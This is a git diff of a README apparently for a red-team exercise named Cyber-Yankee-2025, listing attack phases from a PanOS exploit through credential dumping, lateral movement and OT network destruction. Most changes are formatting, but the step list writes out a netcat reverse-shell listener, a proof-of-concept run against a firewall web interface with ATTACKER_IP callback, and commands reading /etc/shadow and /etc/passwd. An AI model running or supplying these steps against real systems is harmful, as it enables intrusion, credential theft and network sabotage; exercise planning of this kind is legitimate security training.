@@ -1,6 +1,6 @@
 # Cyber-Yankee-2025
 
-### Sassy Panda
+## Sassy Panda
 
 [Phase1](Phase1) - #PanOS Exploit
 
@@ -16,7 +16,6 @@
 
 [Phase6](Phase6) - #Credential Access (via LDAP, SAM/NTDS)
 
-
 ---
 
 [Phase7](Phase7) - Lateral Movement and Persistence *DAY 3*
@@ -25,8 +24,7 @@
 
 [Phase9](Phase9) - OT Network Target Prep (Later Stage) *DAY 4* - DESTROY NETWORK
 
-
-# Steps
+## Steps
 
 1. initial access - setup initial listener (netcat/metasploit) with your 61574
     run command: `nc -lvnp 61574`
@@ -35,6 +33,6 @@
 3. run python:
     `python Poc.py https://<TARGET_PAL_WEB_INTERFACE_IP> <ATTACKER_IP> <ATTACKER_PORT>` # Random high port chosen in script from above
 4. once exploit is through, look at initial listener and wait for callback to catch. once callback catches perform; `whoami`, `ifconfig`
-    run command: 
+    run command:
     `cat /etc/shadow` # grab the users on the machine
     `cat /etc/passwd` # grab what shell permissions every user has
